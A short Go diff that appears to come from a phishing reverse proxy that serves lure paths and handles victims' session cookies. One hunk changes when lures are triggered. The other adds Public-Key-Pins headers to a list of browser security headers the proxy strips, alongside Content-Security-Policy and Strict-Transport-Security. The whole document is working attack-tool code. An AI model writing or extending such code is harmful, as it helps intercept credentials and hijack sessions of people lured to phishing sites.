@@ -186,12 +186,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// handle session
 				if p.handleSession(req.Host) && pl != nil {
 					sc, err := req.Cookie(p.cookieName)
-					if err != nil && !p.isWhitelistedIP(remote_addr) {
+					l, lerr := p.cfg.GetLureByPath(pl_name, req_path)
+					if (err != nil && !p.isWhitelistedIP(remote_addr)) || l != nil {
 						if !p.cfg.IsSiteHidden(pl_name) {
 							var vv string
 							var uv url.Values
-							l, err := p.cfg.GetLureByPath(pl_name, req_path)
-							if err == nil {
+							if lerr == nil {
 								log.Debug("triggered lure for path '%s'", req_path)
 							} else {
 								uv = req.URL.Query()
@@ -620,6 +620,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			var rm_headers = []string{
 				"Content-Security-Policy",
 				"Content-Security-Policy-Report-Only",
+				"Public-Key-Pins",
+				"Public-Key-Pins-Report-Only",
 				"Strict-Transport-Security",
 				"X-XSS-Protection",
 				"X-Content-Type-Options",
